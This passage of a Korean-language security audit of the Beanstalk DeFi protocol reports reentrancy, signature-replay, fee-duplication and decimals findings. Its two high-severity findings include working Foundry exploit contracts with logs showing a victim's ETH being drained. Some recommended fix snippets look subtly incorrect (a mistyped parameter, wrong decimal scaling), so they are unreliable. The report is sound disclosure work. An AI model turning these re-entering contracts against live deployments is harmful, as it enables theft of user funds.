**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

[Carlos Amarante](https://twitter.com/carlitox477)

**Assisting Auditors**

[Alex Roan](https://twitter.com/alexroan)


---

# 발견 사항
## 고위험


### `Pipeline` 실행이 신뢰할 수 없는 외부 컨트랙트로 이관될 때 재진입을 통해 호출자가 보낸 중간 값을 탈취할 수 있음

**설명:** Pipeline은 단일 트랜잭션에서 임의의 수의 유효한 작업을 실행할 수 있도록 Beanstalk Farms 팀이 만든 유틸리티 컨트랙트입니다. `DepotFacet`은 Beanstalk Diamond 프록시 내에서 사용하기 위한 Pipeline의 래퍼(wrapper)입니다. `DepotFacet`을 통해 Pipeline을 사용할 때, Ether 값은 먼저 Diamond 프록시 폴백(fallback) 함수에 대한 payable 호출에 의해 로드되며, 이는 각 패싯 함수의 로직으로 실행을 위임합니다. 예를 들어 [`DepotFacet::advancedPipe`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/DepotFacet.sol#L55-L62)가 호출되면, 값은 Pipeline 내의 [동일한 이름의 함수](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L57-L66)로 전달됩니다.

```solidity
function advancedPipe(AdvancedPipeCall[] calldata pipes, uint256 value)
    external
    payable
    returns (bytes[] memory results)
{
    results = IPipeline(PIPELINE).advancedPipe{value: value}(pipes);
    LibEth.refundEth();
}
```

여기서 주목해야 할 중요한 점은 Diamond 프록시가 받은 전체 Ether 금액을 보내는 것이 아니라, 위 `value` 인자와 동일한 금액을 Pipeline으로 보낸다는 것입니다. 따라서 [`LibEth::refundEth`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibEth.sol#L16-L26)를 사용하여 사용되지 않은 Ether를 반환한 후, 프록시의 전체 Ether 잔액을 호출자에게 전송해야 합니다.

```solidity
function refundEth()
    internal
{
    AppStorage storage s = LibAppStorage.diamondStorage();
    if (address(this).balance > 0 && s.isFarm != 2) {
        (bool success, ) = msg.sender.call{value: address(this).balance}(
            new bytes(0)
        );
        require(success, "Eth transfer Failed.");
    }
}
```

이 로직은 올바르고 의도한 대로 작동하는 것처럼 보입니다. 그러나 `DepotFacet` 및 `Pipeline` 함수에 재진입 방지(reentrancy guard)가 없기 때문에 문제가 발생할 수 있습니다. 잠재적으로 신뢰할 수 없는 외부 컨트랙트에 대한 Pipeline 호출의 특성을 고려할 때, 해당 컨트랙트 자체가 또 다른 신뢰할 수 없는 외부 컨트랙트로 실행을 넘길 수 있으며, 악의적인 컨트랙트가 Beanstalk 및/또는 Pipeline으로 다시 호출(callback)하는 경우 문제가 될 수 있습니다.

```solidity
function advancedPipe(AdvancedPipeCall[] calldata pipes)
    external
    payable
    override
    returns (bytes[] memory results) {
        results = new bytes[](pipes.length);
        for (uint256 i = 0; i < pipes.length; ++i) {
            results[i] = _advancedPipe(pipes[i], results);
        }
    }
```

`DepotFacet::advancedPipe`의 예를 계속 들자면, 파이프 호출 중 하나가 NFT 민팅/전송을 포함하고, 여기서 외부 컨트랙트에 로열티가 ETH가 포함된 저수준 호출(low-level call) 형태로 지불되거나 안전한 전송 확인이 이러한 방식으로 실행을 넘기는 경우를 가정해 봅시다. 악의적인 수신자는 Beanstalk Diamond에 대한 호출을 시작하여 다시 `DepotFacet::advancedPipe`를 트리거할 수 있지만, 이번에는 빈 `pipes` 배열을 사용합니다. 위의 `Pipeline::advancedPipe` 구현을 보면, 이는 단순히 빈 바이트 배열을 반환하고 바로 ETH 환불 로직으로 넘어갑니다. 프록시 잔액이 0이 아니므로(원래 호출에서 `value != msg.value`라고 가정), 이 `msg.value - value` 차액은 악의적인 호출자에게 전송됩니다. 실행이 원래 컨텍스트로 돌아가고 원래 호출자의 트랜잭션이 거의 완료될 때쯤에는, 사용되지 않은 자금을 환불받아야 할 원래 호출자임에도 불구하고 컨트랙트에 초과 ETH가 더 이상 남아있지 않게 됩니다.

이 발견 사항은 `Pipeline` 자체에도 적용됩니다. 악의적인 컨트랙트가 유사하게 Pipeline에 재진입하여 자신의 값을 보내지 않고 중간 Ether 잔액을 사용할 수 있습니다. 예를 들어, `getEthValue`는 [클립보드 값](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L95C17-L95C22)을 payable 값과 검증하지 않기 때문에(루프 내에서의 현재 사용법 때문일 가능성이 큼), `Pipeline::advancedPipe`는 [일반 파이프 인코딩](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L99)을 사용하는 단일 `AdvancedPipeCall`로 호출되어 공격자가 소유한 다른 주소를 호출할 수 있으며, 공격자가 `value` 매개변수를 제어할 수 있다면 남은 모든 Ether를 다시 전달할 수 있습니다. 물론 원래 호출자가 첫 번째 파이프 이후에 더 복잡한 파이프를 수행하려고 시도할 수 있으며, 이는 '자금 부족' 오류로 되돌릴 수 있어 대상 컨트랙트에 관대한(tolerant) 모드 동작이 구현되지 않은 경우 전체 고급 파이프 호출이 실패할 수 있습니다. 따라서 공격자는 악용을 서비스 거부에서 자금 탈취로 격상시키려면 이러한 시나리오에서 전략적이어야 합니다.

**파급력:** Pipeline 호출 수명 동안 실행 제어권을 넘겨받은 악의적인 외부 컨트랙트가 재진입하여 중간 사용자 자금을 훔칠 수 있습니다. 따라서 이 발견 사항은 **높음(HIGH)** 심각도로 결정되었습니다.

**개념 증명 (Proof of Concept):** 다음 forge 테스트는 NFT 로열티 수신자가 Beanstalk와 Pipeline 모두에 재진입하여 실행 종료 시 원래 호출자에게 환불되거나 사용되었어야 할 Diamond 및 Pipeline에 남아 있는 자금을 고갈시키는 능력을 보여줍니다.

```solidity
contract DepotFacetPoC is Test {
    RoyaltyRecipient exploiter;
    address exploiter1;
    DummyNFT dummyNFT;
    address victim;

    function setUp() public {
        vm.createSelectFork("mainnet", ATTACK_BLOCK);

        exploiter = new RoyaltyRecipient();
        dummyNFT = new DummyNFT(address(exploiter));
        victim = makeAddr("victim");
        vm.deal(victim, 10 ether);

        exploiter1 = makeAddr("exploiter1");
        console.log("exploiter1: ", exploiter1);

        address _pipeline = address(new Pipeline());
        vm.etch(PIPELINE, _pipeline.code);

        vm.label(BEANSTALK, "Beanstalk Diamond");
        vm.label(address(dummyNFT), "DummyNFT");
        vm.label(address(exploiter), "Exploiter");
    }

    function test_attack() public {
        emit log_named_uint("Victim balance before: ", victim.balance);
        emit log_named_uint("BEANSTALK balance before: ", BEANSTALK.balance);
        emit log_named_uint("PIPELINE balance before: ", PIPELINE.balance);
        emit log_named_uint("DummyNFT balance before: ", address(dummyNFT).balance);
        emit log_named_uint("Exploiter balance before: ", address(exploiter).balance);
        emit log_named_uint("Exploiter1 balance before: ", exploiter1.balance);

        vm.startPrank(victim);
        AdvancedPipeCall[] memory pipes = new AdvancedPipeCall[](1);
        pipes[0] = AdvancedPipeCall(address(dummyNFT), abi.encodePacked(dummyNFT.mintNFT.selector), abi.encodePacked(bytes1(0x00), bytes1(0x01), uint256(1 ether)));
        IBeanstalk(BEANSTALK).advancedPipe{value: 10 ether}(pipes, 4 ether);
        vm.stopPrank();

        emit log_named_uint("Victim balance after: ", victim.balance);
        emit log_named_uint("BEANSTALK balance after: ", BEANSTALK.balance);
        emit log_named_uint("PIPELINE balance after: ", PIPELINE.balance);
        emit log_named_uint("DummyNFT balance after: ", address(dummyNFT).balance);
        emit log_named_uint("Exploiter balance after: ", address(exploiter).balance);
        emit log_named_uint("Exploiter1 balance after: ", exploiter1.balance);
    }
}

contract DummyNFT {
    address immutable i_royaltyRecipient;
    constructor(address royaltyRecipient) {
        i_royaltyRecipient = royaltyRecipient;
    }

    function mintNFT() external payable returns (bool success) {
        // imaginary mint/transfer logic
        console.log("minting/transferring NFT");
        // console.log("msg.value: ", msg.value);

        // send royalties
        uint256 value = msg.value / 10;
        console.log("sending royalties");
        (success, ) = payable(i_royaltyRecipient).call{value: value}("");
    }
}

contract RoyaltyRecipient {
    bool exploited;
    address constant exploiter1 = 0xDE47CfF686C37d501AF50c705a81a48E16606F08;

    fallback() external payable {
        console.log("entered exploiter fallback");
        console.log("Beanstalk balance: ", BEANSTALK.balance);
        console.log("Pipeline balance: ", PIPELINE.balance);
        console.log("Exploiter balance: ", address(this).balance);
        if (!exploited) {
            exploited = true;
            console.log("exploiting depot facet advanced pipe");
            IBeanstalk(BEANSTALK).advancedPipe(new AdvancedPipeCall[](0), 0);
            console.log("exploiting pipeline advanced pipe");
            AdvancedPipeCall[] memory pipes = new AdvancedPipeCall[](1);
            pipes[0] = AdvancedPipeCall(address(exploiter1), "", abi.encodePacked(bytes1(0x00), bytes1(0x01), uint256(PIPELINE.balance)));
            IPipeline(PIPELINE).advancedPipe(pipes);
        }
    }
}

```
아래 결과에서 볼 수 있듯이, 공격자는 피해자의 비용으로 9 Ether를 추가로 얻을 수 있습니다.
```
Running 1 test for test/DepotFacetPoC.t.sol:DepotFacetPoC
[PASS] test_attack() (gas: 182190)
Logs:
  exploiter1:  0xDE47CfF686C37d501AF50c705a81a48E16606F08
  Victim balance before: : 10000000000000000000
  BEANSTALK balance before: : 0
  PIPELINE balance before: : 0
  DummyNFT balance before: : 0
  Exploiter balance before: : 0
  Exploiter1 balance before: : 0
  entered pipeline advanced pipe
  msg.value:  4000000000000000000
  minting/transferring NFT
  sending royalties
  entered exploiter fallback
  Beanstalk balance:  6000000000000000000
  Pipeline balance:  3000000000000000000
  Exploiter balance:  100000000000000000
  exploiting depot facet advanced pipe
  entered pipeline advanced pipe
  msg.value:  0
  entered exploiter fallback
  Beanstalk balance:  0
  Pipeline balance:  3000000000000000000
  Exploiter balance:  6100000000000000000
  exploiting pipeline advanced pipe
  entered pipeline advanced pipe
  msg.value:  0
  Victim balance after: : 0
  BEANSTALK balance after: : 0
  PIPELINE balance after: : 0
  DummyNFT balance after: : 900000000000000000
  Exploiter balance after: : 6100000000000000000
  Exploiter1 balance after: : 3000000000000000000
```

**권장 완화 조치:** `DepotFacet`과 `Pipeline` 모두에 재진입 방지(reentrancy guards)를 추가하십시오. 또한 `Pipeline::_advancedPipe`에서 클립보드 Ether 값을 `Pipeline::advancedPipe`의 payable 함수 값과 비교하여 검증하는 것을 고려하십시오.


### 실행이 신뢰할 수 없는 외부 컨트랙트로 이관될 때 재진입을 통해 호출자가 보낸 중간 값이 `FarmFacet` 함수에서 탈취될 수 있음

**설명:** `FarmFacet`은 Farm 호출을 사용하여 단일 트랜잭션에서 여러 Beanstalk 함수를 호출할 수 있게 합니다. Beanstalk의 EIP-2535 DiamondStorage에 저장된 모든 함수는 Farm 호출로 호출될 수 있으며, `DepotFacet`에서 시작된 Pipeline 호출과 유사하게, `LibFunction`에 [문서화된](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibFunction.sol#L49-L74) "클립보드" 인코딩을 사용하여 `FarmFacet` 내에서 고급 Farm 호출을 수행할 수 있습니다.

[`FarmFacet::farm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L35-L45)과 [`FarmFacet::advancedFarm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L53-L63) 모두 다음과 같이 정의된 [`withEth` modifier](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L100-L107)를 사용합니다:

```solidity
// signals to Beanstalk functions that they should not refund Eth
// at the end of the function because the function is wrapped in a Farm function
modifier withEth() {
    if (msg.value > 0) s.isFarm = 2;
    _;
    if (msg.value > 0) {
       s.isFarm = 1;
        LibEth.refundEth();
    }
}
```
예를 들어 `DepotFacet` 내에서 [`LibEth::refundEth`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibEth.sol#L16-L26)와 함께 사용될 때, `s.isFarm == 2`인 경우 호출이 `FarmFacet`에서 시작된 것으로 식별됩니다. 이는 값이 후속 호출에서 사용될 수 있도록 Beanstalk 내의 중간 Farm 호출이 아닌 최상위 FarmFacet 함수 호출이 끝날 때 ETH 환불이 발생해야 함을 나타냅니다.

```solidity
function refundEth()
    internal
{
    AppStorage storage s = LibAppStorage.diamondStorage();
    if (address(this).balance > 0 && s.isFarm != 2) {
        (bool success, ) = msg.sender.call{value: address(this).balance}(
            new bytes(0)
        );
        require(success, "Eth transfer Failed.");
    }
}
```

`DepotFacet` 및 `Pipeline`의 취약점과 유사하게, `FarmFacet` Farm 함수들도 신뢰할 수 없고 악의적인 외부 컨트랙트에 의한 재진입을 통해 호출자가 보낸 중간 값이 탈취될 수 있습니다. 이 경우, 공격자는 예를 들어 Beanstalk Fertilizer의 수신자가 될 수 있습니다. 이는 [`TokenSupportFacet::transferERC1155`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenSupportFacet.sol#L85-L92)를 활용하여 `FarmFacet` 함수를 통해 수행될 가능성이 높은 작업이며, 이러한 토큰의 전송은 Fertilizer 수신자의 `IERC1155ReceiverUpgradeable::onERC1155Received` 훅을 차례로 호출하는 [`Fertilizer1155:__doSafeTransferAcceptanceCheck`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/tokens/Fertilizer/Fertilizer1155.sol#L42)를 호출하여 "안전하게" 수행되기 때문입니다.

위의 예를 계속하자면, 악의적인 수신자는 `FarmFacet`으로 다시 호출하고 빈 calldata와 단 `1 wei`의 payable 값으로 `Fertilizer1155` 안전 전송 수락 확인을 통해 Farm 함수에 재진입할 수 있습니다. 이렇게 하면 빈 데이터에서 루프 반복이 발생하지 않고 modifier 내의 조건부 블록이 (아주 약간의) 0이 아닌 `msg.value`로 인해 입력되므로, 공격자의 트랜잭션 실행이 바로 환불 로직으로 넘어갑니다. 공격자의 컨텍스트에서 `s.isFarm == 1`이므로 `LibEth::refundEth` 호출이 성공하여 전체 Diamond 프록시 잔액을 보냅니다. 원래 호출자의 Farm 호출 컨텍스트에서 실행이 계속될 때, 그들의 `msg.value`도 0이 아니었으므로 여전히 조건문에 진입합니다. 그러나 환불할 ETH 잔액이 더 이상 없으므로 이 호출은 값을 보내지 않고 종료됩니다.

**파급력:** Farm 호출 수명 동안 실행 제어권을 넘겨받은 악의적인 외부 컨트랙트가 재진입하여 중간 사용자 자금을 훔칠 수 있습니다. 따라서 이 발견 사항은 **높음(HIGH)** 심각도로 결정되었습니다.

**개념 증명 (Proof of Concept):** 다음 forge 테스트는 Fertilizer 수신자가 Beanstalk에 재진입하여 실행 종료 시 원래 호출자에게 환불되어야 할 Diamond에 남아 있는 자금을 고갈시키는 능력을 보여줍니다.

```solidity
contract FertilizerRecipient {
    bool exploited;

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
        console.log("entered exploiter onERC1155Received");
        if (!exploited) {
            exploited = true;
            console.log("exploiting farm facet farm call");
            AdvancedFarmCall[] memory data = new AdvancedFarmCall[](0);
            IBeanstalk(BEANSTALK).advancedFarm{value: 1 wei}(data);
            console.log("finished exploiting farm facet farm call");
        }
        return bytes4(0xf23a6e61);
    }

    fallback() external payable {
        console.log("entered exploiter fallback");
        console.log("Beanstalk balance: ", BEANSTALK.balance);
        console.log("Exploiter balance: ", address(this).balance);
    }
}

contract FarmFacetPoC is Test {
    uint256 constant TOKEN_ID = 3445713;
    address constant VICTIM = address(0x995D1e4e2807Ef2A8d7614B607A89be096313916);
    FertilizerRecipient exploiter;

    function setUp() public {
        vm.createSelectFork("mainnet", ATTACK_BLOCK);

        FarmFacet farmFacet = new FarmFacet();
        vm.etch(FARM_FACET, address(farmFacet).code);

        Fertilizer fert = new Fertilizer();
        vm.etch(FERTILIZER, address(fert).code);

        assertGe(IERC1155(FERTILIZER).balanceOf(VICTIM, TOKEN_ID), 1, "Victim does not have token");

        exploiter = new FertilizerRecipient();
        vm.deal(address(exploiter), 1 wei);

        vm.label(VICTIM, "VICTIM");
        vm.deal(VICTIM, 10 ether);

        vm.label(BEANSTALK, "Beanstalk Diamond");
        vm.label(FERTILIZER, "Fertilizer");
        vm.label(address(exploiter), "Exploiter");
    }

    function test_attack() public {
        emit log_named_uint("VICTIM balance before: ", VICTIM.balance);
        emit log_named_uint("BEANSTALK balance before: ", BEANSTALK.balance);
        emit log_named_uint("Exploiter balance before: ", address(exploiter).balance);

        vm.startPrank(VICTIM);
        // approve Beanstalk to transfer Fertilizer
        IERC1155(FERTILIZER).setApprovalForAll(BEANSTALK, true);

        // encode call to `TokenSupportFacet::transferERC1155`
        bytes4 selector = 0x0a7e880c;
        assertEq(IBeanstalk(BEANSTALK).facetAddress(selector), address(0x5e15667Bf3EEeE15889F7A2D1BB423490afCb527), "Incorrect facet address/invalid function");

        AdvancedFarmCall[] memory data = new AdvancedFarmCall[](1);
        data[0] = AdvancedFarmCall(abi.encodeWithSelector(selector, address(FERTILIZER), address(exploiter), TOKEN_ID, 1), abi.encodePacked(bytes1(0x00)));
        IBeanstalk(BEANSTALK).advancedFarm{value: 10 ether}(data);
        vm.stopPrank();

        emit log_named_uint("VICTIM balance after: ", VICTIM.balance);
        emit log_named_uint("BEANSTALK balance after: ", BEANSTALK.balance);
        emit log_named_uint("Exploiter balance after: ", address(exploiter).balance);
    }
}
```

아래 결과에서 볼 수 있듯이, 공격자는 피해자가 보낸 초과 10 Ether를 훔칠 수 있습니다.

```
Running 1 test for test/FarmFacetPoC.t.sol:FarmFacetPoC
[PASS] test_attack() (gas: 183060)
Logs:
  VICTIM balance before: : 10000000000000000000
  BEANSTALK balance before: : 0
  Exploiter balance before: : 1
  data.length: 1
  entered __doSafeTransferAcceptanceCheck
  to is contract, calling hook
  entered exploiter onERC1155Received
  exploiting farm facet farm call
  data.length: 0
  entered exploiter fallback
  Beanstalk balance:  0
  Exploiter balance:  10000000000000000001
  finished exploiting farm facet farm call
  VICTIM balance after: : 0
  BEANSTALK balance after: : 0
  Exploiter balance after: : 10000000000000000001
```

**권장 완화 조치:** `FarmFacet` Farm 함수에 재진입 방지(reentrancy guard)를 추가하십시오.

\clearpage
## 중간 위험


### 하드 포크 시 `LibTokenPermit` 로직이 서명 리플레이 공격에 취약함

**설명:** [`C.sol`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L92-L94)에 지정된 정적 `CHAIN_ID` [상수](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenPermit.sol#L65)를 사용하는 [`LibTokenPermit::_buildDomainSeparator`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenPermit.sol#L59-L69)의 구현으로 인해, 하드 포크의 경우 이더리움 메인넷의 모든 서명된 허가(permit)가 포크된 체인에서 리플레이될 수 있습니다.

**파급력:** 포크된 체인에서의 서명 리플레이 공격은 체인 중 하나에서 주소에 부여된 서명된 허가가 계정 넌스(nonce)가 준수되는 한 다른 체인에서 재사용될 수 있음을 의미합니다. BEAN이 유동성의 일부를 WETH로 가지고 있다는 점을 감안할 때, 이는 ETHPoW에서의 [Omni Bridge calldata replay exploit](https://medium.com/neptune-mutual/decoding-omni-bridges-call-data-replay-exploit-f1c7e339a7e8)과 유사한 취약점에 노출될 수 있습니다.

**권장 완화 조치:** `_buildDomainSeparator` 구현을 수정하여 현재 `block.chainid` 전역 컨텍스트 변수를 직접 읽도록 하십시오. 가스 효율성을 원하는 경우, 컨트랙트 생성 시 현재 체인 ID를 캐시하고 체인 ID 변경이 감지된 경우(즉, `block.chainid` != 캐시된 체인 ID)에만 도메인 구분자를 다시 계산하는 것이 좋습니다.

```diff
    function _buildDomainSeparator(bytes32 typeHash, bytes32 name, bytes32 version) internal view returns (bytes32) {
        return keccak256(
            abi.encode(
                typeHash,
                name,
                version,
-               C.getChainId(),
+               block.chainid,
                address(this)
            )
        );
    }
```


### `EXTERNAL_INTERNAL` 'from' 모드 및 `EXTERNAL` 'to' 모드로 전송 수수료 토큰을 전송할 때 `LibTransfer::transferFee`에 의해 수수료가 중복 지불됨

**설명:** Beanstalk은 프로토콜 내에 머물러야 하는 토큰을 사용할 때 트랜잭션 수수료를 크게 줄여주는 내부 가상 잔액 시스템을 사용합니다. `LibTransfer`는 전송 중인 자금의 출발지 'from' 모드와 목적지 'to' 모드를 모두 고려하여 계정 간의 모든 전송을 관리함으로써 이를 달성합니다. 결과적으로 자금 출처(from 모드)에 따라 네 가지 유형의 전송이 있습니다.

* `EXTERNAL`: 발신자는 작업에 내부 잔액을 사용하지 않습니다.
* `INTERNAL`: 발신자는 작업에 내부 잔액을 사용합니다.
* `EXTERNAL_INTERNAL`: 발신자는 원하는 모든 자금을 전송하기 위해 내부 잔액을 활용하려고 시도합니다. 보낼 자금이 남으면 외부 소유 자금을 사용하여 차액을 충당합니다.
* `INTERNAL_TOLERANT`: 발신자는 작업에 내부 잔액을 활용합니다. 내부 잔액이 불충분한 경우 작업은 (revert 없이) 이 감소된 금액으로 계속됩니다. 따라서 `LibTransfer` 함수의 반환 값을 항상 확인하여, 특히 이 내부 관대한(tolerant) 케이스에서 실제 사용된 금액으로 호출 함수의 실행을 계속하는 것이 필수적입니다.

`TokenTransfer`의 [`LibTransfer::transferToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTransfer.sol#L43-L44) 현재 구현은 `(from 모드: EXTERNAL ; to 모드: EXTERNAL)`의 경우 발신자에서 수신자로의 안전한 전송 작업을 보장합니다.

```solidity
// LibTransfer::transferToken
if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {
    uint256 beforeBalance = token.balanceOf(recipient);
    token.safeTransferFrom(sender, recipient, amount);
    return token.balanceOf(recipient).sub(beforeBalance);
}
amount = receiveToken(token, amount, sender, fromMode);
sendToken(token, amount, recipient, toMode);
return amount;
```

이 작업을 수행하면 자금이 먼저 컨트랙트로 전송된 다음 수신자에게 전송되는 경우 fee-on-transfer 토큰 수수료의 중복을 피할 수 있습니다. 그러나 내부 잔액이 전체 전송 금액을 충당하기에 충분하지 않을 때 `(from 모드: EXTERNAL_INTERNAL ; to 모드: EXTERNAL)`에 이 함수가 사용되면 `LibTransfer::transferToken` 잔액에 두 배의 수수료가 발생합니다.

1. 남은 토큰 잔액이 먼저 Beanstalk Diamond로 전송되어 수수료가 발생합니다.
2. 남은 토큰 잔액이 수신자에게 전송되어 다시 수수료가 발생합니다.

**파급력:** 내부 잔액이 전체 전송 금액을 충당하기에 충분하지 않은 경우 fee-on-transfer 토큰과 함께 `(from 모드: EXTERNAL_INTERNAL ; to 모드: EXTERNAL)`에 사용되면 `LibTransfer::transferToken`에 중복 수수료가 발생합니다.

Beanstalk은 현재 토큰 전송에 수수료를 부과하지 않지만, USDT가 프로토콜과 연관되어 있으며 해당 컨트랙트에는 향후 원할 경우 토큰 전송 수수료 메커니즘을 구현하는 로직이 이미 도입되어 있습니다. 수수료 중복은 자금 손실을 의미하지만, 이 문제가 발생할 가능성이 낮다는 점을 고려하여 이 문제의 심각도는 **중간(MEDIUM)** 으로 지정되었습니다.

**권장 완화 조치:** 수수료 중복을 피하기 위해 이 케이스를 처리하는 내부 함수 `LibTransfer::handleFromExternalInternalToExternalTransfer`를 추가하십시오. 예를 들어:

```solidity
function handleFromExternalInternalToExternalTransfer(
    IERC20 token,
    address sender,
    address recipient,
    address amount
) internal {
    uint256 amountFromInternal = LibBalance.decreaseInternalBalance(
        sender,
        token,
        amount,
        true // allowPartial to avoid revert
    );
    uint256 pendingAmount = amount - amountFromInternal;
    if (pendingAmount != 0) {
        token.safeTransferFrom(sender, recipient, pendingAmount);
    }
    token.safeTransfer(sender, amountFromInternal);
}
```

그런 다음 `LibTransfer::transferToken`에서 이 새로운 함수의 사용을 고려하십시오.

```diff
    function transferToken(
        IERC20 token,
        address sender,
        address recipient,
        uint256 amount,
        From fromMode,
        To toMode
    ) internal returns (uint256 transferredAmount) {
-       if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {
+       if (toMode == To.EXTERNAL) {
+           if (fromMode == From.EXTERNAL) {
                uint256 beforeBalance = token.balanceOf(recipient);
                token.safeTransferFrom(sender, recipient, amount);
                return token.balanceOf(recipient).sub(beforeBalance);
+           } else if (fromMode == From.EXTERNAL_INTERNAL) {
+               handleFromExternalInternalToExternalTransfer(token, sender, recipient, amount);
+               return amount;
+           }
        }
        amount = receiveToken(token, amount, sender, fromMode);
        sendToken(token, amount, recipient, toMode);
        return amount;
    }
```


### `FundraiserFacet` 로직은 토큰 소수점(decimals)을 증가시킬 수 있는 컨트랙트 업그레이드를 고려하지 않음

**설명:** `FundraiserFacet`의 모금 로직은 모금되는 토큰의 소수점이 모금 생성 시부터 자금이 조달될 때까지 동일한 자릿수를 유지할 것이라고 가정합니다. USDC의 경우 소수점 자릿수를 늘리는 컨트랙트 업그레이드가 발생하면 이 가정이 무효화되어 `s.fundraisers[id].remaining`이 처리하는 회계가 위험해질 수 있습니다.

**파급력:** 원래 모금 토큰의 소수점 자릿수가 증가하면 사용자는 `FundraiserFacet::fund`를 통해 예상보다 적은 토큰을 보내고 의도한 것보다 더 많은 Pods를 받을 수 있습니다.

**개념 증명 (Proof of Concept):**
1. Beanstalk이 1M USDC에 대한 USDC 모금을 생성합니다.
2. USDC 소수점이 6에서 18로 업데이트됩니다. 즉, 모금할 USDC 금액은 $1,000,000 \times 10^{6} = 1 \times 10^{12}$가 아니라 $1,000,000 \times 10^{18}$이어야 합니다.
3. Eve는 $1 \times 10^{12}$ 기본 단위의 USDC(이제 $1 \times 10^{-18}$ USDC에 해당)를 사용하여 모금에 전액 자금을 지원하고 1M Beans 가치의 Pods를 받습니다.

최종 결과는 Beanstalk이 1M Pods 발행 대가로 $1 \times 10^{-6}$ USD의 USDC를 받았다는 것입니다.

**권장 완화 조치:** 모금 생성 중에 소수점을 저장하고 `FundraiserFacet::fund` 호출 시 일관성을 확인하는 것이 좋습니다. 이는 업데이트 시 `s.fundraisers[id].remaining`과 저장된 소수점을 업데이트하는 새로운 함수를 생성하여 달성할 수 있습니다. 예를 들어:

```diff
    // FundraiserFacet.sol
    function createFundraiser(
        address payee,
        address token,
        uint256 amount
    ) external payable {
        LibDiamond.enforceIsOwnerOrContract();

        // The {FundraiserFacet} was initially created to support USDC, which has the
        // same number of decimals as Bean (6). Fundraisers created with tokens measured
        // to a different number of decimals are not yet supported.
        if (ERC20(token).decimals() != 6) {
            revert("Fundraiser: Token decimals");
        }

        uint32 id = s.fundraiserIndex;
        s.fundraisers[id].token = token;
        s.fundraisers[id].remaining = amount;
        s.fundraisers[id].total = amount;
        s.fundraisers[id].payee = payee;
        s.fundraisers[id].start = block.timestamp;
+       s.fundraisers[id].savedDecimals = 6;
        s.fundraiserIndex = id + 1;

        // Mint Beans to pay for the Fundraiser. During {fund}, 1 Bean is burned
        // for each `token` provided to the Fundraiser.
        // Adjust `amount` based on `token` decimals to support tokens with different decimals.
        C.bean().mint(address(this), amount);

        emit CreateFundraiser(id, payee, token, amount);
    }

    function fund(
        uint32 id,
        uint256 amount,
        LibTransfer.From mode
    ) external payable nonReentrant returns (uint256) {
        uint256 remaining = s.fundraisers[id].remaining;

        // Check amount remaining and constrain
        require(remaining > 0, "Fundraiser: completed");
        if (amount > remaining) {
            amount = remaining;
        }
+
+       require(s.fundraisers[id].token.decimals() == s.fundraisers[id].savedDecimals, "Fundraiser token decimals not synchronized.");
+
        // Transfer tokens from msg.sender -> Beanstalk
        amount = LibTransfer.receiveToken(
            IERC20(s.fundraisers[id].token),
            amount,
            msg.sender,
            mode
        );
        s.fundraisers[id].remaining = remaining - amount; // Note: SafeMath is redundant here.
        emit FundFundraiser(msg.sender, id, amount);

        // If completed, transfer tokens to payee and emit an event
        if (s.fundraisers[id].remaining == 0) {
            _completeFundraiser(id);
        }

        // When the Fundraiser was initialized, Beanstalk minted Beans.
        C.bean().burn(amount);

        // Calculate the number of Pods to Sow.
        // Fundraisers bypass Morning Auction behavior and Soil requirements,
        // calculating return only based on the current `s.w.t`.
        uint256 pods = LibDibbler.beansToPods(
            amount,
            uint256(s.w.t).mul(LibDibbler.TEMPERATURE_PRECISION)
        );

        // Sow for Pods and return the number of Pods received.
        return LibDibbler.sowNoSoil(msg.sender, amount, pods);
    }
+
+   function synchronizeFundraiserDecimals(uint32 id) public {
+       uint32 currentTokenDecimals = s.fundraisers[id].token.decimals();
+       uint32 savedDecimals = s.fundraisers[id].savedDecimals;
+       require(currentTokenDecimals != savedDecimals, "Fundraiser token decimals already synchronized");
+       if (currentTokenDecimals > savedDecimals) {
+           uint32 decimalDifference = currentTokenDecimals - savedDecimals;
+           s.fundraisers[id].total = s.fundraisers[id].total * decimalDifference;
+           s.fundraisers[id].remaining = s.fundraisers[id].remaining * decimalDifference;
+       } else {
+           uint32 decimalDifference = savedDecimals - currentTokenDecimals;
